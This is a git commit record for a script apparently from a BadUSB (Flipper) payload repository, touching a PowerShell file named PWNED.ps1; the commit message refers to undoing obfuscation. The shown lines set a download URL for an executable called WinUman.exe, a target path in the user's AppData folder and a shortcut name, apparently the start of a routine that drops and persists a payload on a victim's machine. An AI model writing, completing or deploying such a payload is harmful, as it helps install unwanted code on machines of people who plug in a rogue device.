33e75c797587891ba82e7b0829a48a8af9f46d21
Grindlewalt <110056925+the-shadow-walker@users.noreply.github.com>
2025-07-01 14:26:25 -0700

    Changed back to un obfuscation

--- PS1/PWNED.ps1
+++ PS1/PWNED.ps1
@@ -1,5 +1,4 @@
 # Variables
-
 $exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
 $exePath = "$env:APPDATA\WinUman.exe"
 $shortcutName = "WinUman.lnk"
